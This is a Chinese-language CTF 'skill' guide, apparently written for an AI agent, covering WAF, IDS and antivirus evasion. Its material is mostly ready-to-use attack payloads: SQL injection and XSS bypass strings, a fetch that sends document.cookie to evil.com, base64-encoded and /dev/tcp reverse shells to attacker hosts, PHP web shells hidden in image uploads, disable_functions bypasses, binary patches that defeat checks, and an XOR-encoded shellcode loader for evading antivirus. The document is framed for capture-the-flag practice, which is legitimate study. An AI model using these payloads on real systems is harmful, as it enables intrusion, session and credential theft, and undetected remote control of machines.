# 对抗规避 Skill — CTF WAF Bypass / 安全设备绕过 / Binary Evasion 指引

## 适用场景
CTF 对抗规避类题目，包括 WAF 绕过、IDS/IPS 规避、沙箱逃逸、AV 免杀、编码绕过、流量伪装、Binary Patching 绕过检测等。

## ⚠️ 核心原则
**所有 hex/字节操作必须用 Python 脚本处理，禁止手动计算。**
**先分析清楚检测逻辑，再针对性绕过，不要盲试。**

## ⚠️ 工作区隔离规则（极重要）
**每道题的所有文件操作必须在自己的工作目录下进行（`$PWD` = `/workspace/<unique_code>/`）。**

- 禁止使用 `/root/workspace` 或 `/tmp` 存放题目二进制文件
- 从靶场下载文件时使用 `curl -o ./validator <url>` 而不是 `-o /tmp/xxx`
- 已有文件先用 `file ./binary && md5sum ./binary` 确认身份
- 多个对抗规避题并行时，`/root/workspace` 中的文件会被其他题覆盖，只有自己工作目录的文件才可信

## ⚠️ 文件来源判定规则
1. **靶场页面声明的文件类型 = 真实类型**，不要自行推翻
2. 每次开始分析前，必须从靶场重新下载并验证：`curl -o ./validator http://TARGET/download && chmod +x && file ./validator && md5sum ./validator`
3. 不信任 workspace 中的已有二进制文件，可能是其他题污染的

---

## 阶段一：WAF 检测与识别

### 1.1 判断是否有 WAF
```bash
# 发送明显恶意请求观察响应差异
curl -si "http://TARGET/?id=1' OR 1=1--"
curl -si "http://TARGET/?cmd=cat /etc/passwd"
curl -si "http://TARGET/" -A "sqlmap/1.0"

# 特征响应头
# Cloudflare: cf-ray, __cfduid
# ModSecurity: Mod_Security, NOYB
# AWS WAF: x-amzn-RequestId
# 阿里云盾: alicdn / aliwaf

# wafw00f（如果有安装）
wafw00f http://TARGET/
```

### 1.2 WAF 行为分析
```bash
# 逐步添加关键字，定位被拦截的关键词
curl -s -o /dev/null -w "%{http_code}" "http://TARGET/?id=1"           # 正常 → 200
curl -s -o /dev/null -w "%{http_code}" "http://TARGET/?id=1'"          # 单引号
curl -s -o /dev/null -w "%{http_code}" "http://TARGET/?id=1 union"     # union
curl -s -o /dev/null -w "%{http_code}" "http://TARGET/?id=1 select"    # select
curl -s -o /dev/null -w "%{http_code}" "http://TARGET/?id=1 union select"  # 组合
```

---

## 阶段二：SQL 注入 WAF 绕过

### 2.1 空格绕过
```sql
-- 注释替换
UNION/**/SELECT
UNION%0aSELECT
UNION%09SELECT
UNION%0dSELECT
UNION%a0SELECT

-- 括号替换空格
UNION(SELECT(1),(2),(3))
SELECT(group_concat(table_name))FROM(information_schema.tables)WHERE(table_schema=database())
```

### 2.2 关键词绕过
```sql
-- 大小写混合
uNiOn SeLeCt
UnIoN sElEcT

-- 双写绕过（WAF 只替换一次）
UNunionION SEselectLECT

-- 内联注释
/*!UNION*/ /*!SELECT*/
/*!50000UNION*/ /*!50000SELECT*/

-- 等价函数替换
-- information_schema → sys.schema_table_statistics (MySQL 5.7+)
-- concat → concat_ws / group_concat
-- substr → mid / left / right
-- ascii → ord / hex
-- if → case when
```

### 2.3 引号绕过
```sql
-- 十六进制替代字符串
WHERE table_name=0x7573657273  -- 'users'

-- char 函数
WHERE table_name=CHAR(117,115,101,114,115)

-- 反引号
SELECT `flag` FROM `flags`
```

### 2.4 数字型注入（无需引号）
```bash
# 布尔盲注 — 无需 union
curl -s "http://TARGET/?id=1 AND (SELECT LENGTH(flag) FROM flags LIMIT 1)>20"
curl -s "http://TARGET/?id=1 AND (SELECT ASCII(MID(flag,1,1)) FROM flags LIMIT 1)>100"

# 时间盲注
curl -s "http://TARGET/?id=1 AND IF(ASCII(MID((SELECT flag FROM flags LIMIT 1),1,1))>100,SLEEP(3),0)"
```

---

## 阶段三：XSS WAF 绕过

### 3.1 标签绕过
```html
<!-- 非常见标签 -->
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<video src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>

<!-- 大小写 -->
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x OnErRoR=alert(1)>
```

### 3.2 编码绕过
```html
<!-- HTML 实体 -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- Unicode 编码 -->
<script>\u0061lert(1)</script>

<!-- URL 编码（在 URL 参数中） -->
%3Cscript%3Ealert(1)%3C/script%3E
```

### 3.3 JavaScript 变体
```javascript
// 无括号调用
alert`1`
window['alert'](1)
self['ale'+'rt'](1)
Reflect.apply(alert, null, [1])
[].constructor.constructor('alert(1)')()

// 无 alert
confirm(1)
prompt(1)
console.log(document.cookie)
fetch('http://evil.com/?c='+document.cookie)
```

---

## 阶段四：命令注入绕过

### 4.1 空格绕过
```bash
cat${IFS}/flag
cat$IFS$9/flag
cat</flag
{cat,/flag}
cat%09/flag     # tab
X=$'\x20';cat${X}/flag
```

### 4.2 关键词绕过
```bash
# 引号拼接
c''at /fl''ag
c\at /fl\ag

# 变量拼接
a=c;b=at;$a$b /flag
echo Y2F0IC9mbGFn|base64 -d|bash

# 通配符
cat /f???
cat /f*
cat /fla[g]

# rev 反转
echo "galf/ tac" | rev | bash
```

### 4.3 反弹 Shell 绕过
```bash
# Base64 编码
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash

# Python 无 import
python3 -c "exec(__import__('base64').b64decode('PAYLOAD_B64'))"

# 无 bash 的反弹
exec 5<>/dev/tcp/ATTACKER/4444; cat <&5 | while read line; do $line 2>&1 >&5; done
```

---

## 阶段五：文件上传绕过

### 5.1 扩展名绕过
```
.php → .pHp / .php3 / .php4 / .php5 / .phtml / .pht
.jsp → .jspx / .jspa / .jspf
.asp → .asa / .asax / .ascx / .ashx / .asmx / .cer
双扩展：shell.php.jpg / shell.jpg.php
空字节：shell.php%00.jpg（PHP < 5.3.4）
.htaccess 上传：AddType application/x-httpd-php .jpg
.user.ini：auto_prepend_file=shell.jpg
```

### 5.2 Content-Type 绕过
```bash
curl -X POST http://TARGET/upload \
  -F "file=@shell.php;type=image/jpeg"

# 保留图片头 + PHP 代码
printf '\xff\xd8\xff\xe0<?php system($_GET["cmd"]); ?>' > shell.php.jpg
```

### 5.3 内容检测绕过
```bash
# 图片马
cp legit.jpg shell.jpg
echo '<?php system($_GET["cmd"]); ?>' >> shell.jpg

# 短标签
<?= system($_GET['cmd']); ?>

# 反引号
<?= `$_GET[cmd]`; ?>

# 条件竞争
while true; do curl -s -X POST http://TARGET/upload -F "file=@shell.php"; done &
while true; do curl -s "http://TARGET/uploads/shell.php?cmd=cat+/flag" | grep -o "flag{.*}"; done
```

---

## 阶段六：PHP disable_functions 绕过

```php
// LD_PRELOAD 劫持
// pcntl_exec（如果未禁用）
pcntl_exec("/bin/cat", ["/flag"]);

// proc_open
$process = proc_open('cat /flag', [['pipe','r'],['pipe','w'],['pipe','w']], $pipes);
echo stream_get_contents($pipes[1]);

// FFI（PHP 7.4+）
$ffi = FFI::cdef("int system(const char *command);");
$ffi->system("cat /flag");
```

---

## 阶段七：Binary Evasion（二进制对抗规避）

### 7.1 分析检测逻辑
```bash
# 先逆向理解检测点
file ./validator
strings ./validator | grep -iE "detect|check|block|allow|pass|fail|flag"
objdump -d ./validator | head -200

# 用 ltrace 跟踪函数调用
ltrace ./validator < input_file 2>&1 | head -50

# 用 strace 跟踪系统调用
strace -f ./validator < input_file 2>&1 | grep -iE "open|read|write|exec"
```

### 7.2 Binary Patching 绕过检测
```python
#!/usr/bin/env python3
"""通用 binary patching 绕过检测"""

data = bytearray(open('./validator', 'rb').read())

# === 方法 1：反转条件跳转 ===
# 找到检测函数返回后的分支判断，反转 JNE↔JE
# objdump -d ./validator | grep -B5 -A5 "test.*eax\|cmp.*eax"
OFFSET = 0x1234  # 从反汇编确定
data[OFFSET] = 0x74 if data[OFFSET] == 0x75 else 0x75  # JNE↔JE

# === 方法 2：NOP 掉检测调用 ===
# 找到 call <check_function> 的位置，替换为 NOP
CHECK_CALL_OFFSET = 0x5678
CALL_LENGTH = 5  # x86 CALL 指令 = 5 字节
data[CHECK_CALL_OFFSET:CHECK_CALL_OFFSET+CALL_LENGTH] = b'\x90' * CALL_LENGTH

# === 方法 3：让检测函数始终返回 true ===
# 找到检测函数入口，写入 mov eax,1; ret
FUNC_ENTRY = 0xABCD
data[FUNC_ENTRY:FUNC_ENTRY+6] = b'\xb8\x01\x00\x00\x00\xc3'  # mov eax,1; ret

open('./validator_patched', 'wb').write(data)

import os, subprocess
os.chmod('./validator_patched', 0o755)
result = subprocess.run(['./validator_patched'], capture_output=True, text=True, timeout=10)
print(result.stdout, result.stderr)
```

### 7.3 反混淆技巧
```python
#!/usr/bin/env python3
"""反混淆常见模式"""

data = open('./obfuscated', 'rb').read()

# 1. 自解密代码：找到解密循环，提取密钥和密文，用 Python 直接解密
# 特征：一段 XOR 循环 + 一段乱码数据
import re

# 搜索 XOR 循环中的密钥字节
# 常见模式：xor byte [reg+offset], KEY
xor_patterns = re.findall(rb'\x80[\x30-\x37](.)', data)
if xor_patterns:
    print("Possible XOR keys:", [hex(k[0]) for k in xor_patterns])

# 2. 字符串解混淆：逐个函数调用 + 拼接
# 运行程序并 hook 字符串操作
# ltrace ./obfuscated 2>&1 | grep -E "str|mem|printf"

# 3. 控制流平坦化：识别 dispatcher 变量
# 特征：一个大 switch-case 或 if-else 链，通过修改 state 变量跳转
# 策略：NOP 掉 dispatcher，直接连接各个 basic block

# 4. 提取嵌入的加密数据
# 在 .rodata / .data 段中搜索高 entropy 块
from collections import Counter
import math

for offset in range(0, len(data) - 64, 16):
    block = data[offset:offset+64]
    c = Counter(block)
    entropy = -sum(count/64 * math.log2(count/64) for count in c.values() if count)
    if entropy > 6.5:
        print(f"High entropy block at {hex(offset)}: entropy={entropy:.2f}")
        print(f"  hex: {block[:32].hex()}")
```

### 7.4 AV/EDR 规避（免杀）
```python
#!/usr/bin/env python3
"""生成免杀 payload"""

import os

# 1. XOR 编码 shellcode
shellcode = b"\x48\x31\xc0..."  # 原始 shellcode
key = 0x42
encoded = bytes(b ^ key for b in shellcode)

# 2. 生成自解码 C 代码
c_code = f"""
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

unsigned char buf[] = {{{','.join(f'0x{b:02x}' for b in encoded)}}};

int main() {{
    // XOR 解码
    for (int i = 0; i < sizeof(buf); i++) {{
        buf[i] ^= 0x{key:02x};
    }}
    // 分配可执行内存
    void *exec = mmap(0, sizeof(buf), PROT_READ|PROT_WRITE|PROT_EXEC,
                      MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
    memcpy(exec, buf, sizeof(buf));
    ((void(*)())exec)();
}}
"""

open('payload.c', 'w').write(c_code)
os.system('gcc -o payload payload.c -z execstack -no-pie')

# 3. 验证
os.system('strings payload | grep -c "bin/sh"')  # 应为 0（已编码）
```

### 7.5 沙箱逃逸
```bash
# 检测沙箱环境
# 常见沙箱特征：
cat /proc/self/status | grep -i seccomp   # seccomp 过滤
cat /proc/self/status | grep -i "Cpus_allowed"  # CPU 限制
ls -la /proc/self/ns/  # namespace 隔离

# 如果是 seccomp：
# 用 seccomp-tools 分析允许的系统调用
seccomp-tools dump ./challenge 2>/dev/null

# 绕过策略：
# 1. 使用允许的 syscall 组合达成目的
# 2. 如果允许 openat + read + write → 读 flag
# 3. 如果允许 execveat → 执行 /bin/sh
```

---

## 常见坑

| 现象 | 可能原因 | 对策 |
|------|---------|------|
| 所有绕过都被拦截 | WAF 规则很严格 | 尝试 HTTP 参数污染 / chunked 传输 / multipart |
| 绕过成功但无回显 | 输出被过滤 | 用外带（DNS/HTTP）或写文件 |
| 上传成功但无法执行 | 上传目录无执行权限 | 检查 .htaccess / nginx 配置 |
| 编码绕过后报错 | 多层编码/解码顺序错误 | 逐层编码测试，确认每层 |
| 反弹 Shell 不出网 | 出站流量被过滤 | 用 ICMP / DNS 隧道，或写文件回读 |
| patch 后程序 crash | 破坏了指令边界 | 确认在指令边界 patch，NOP 补齐到对齐 |
| hex 操作结果不对 | 手动计算出错 | **必须写 Python 脚本，禁止手算** |
| 免杀后仍被检测 | 静态特征泄露 | 检查 strings 输出，确保敏感字符串已编码 |
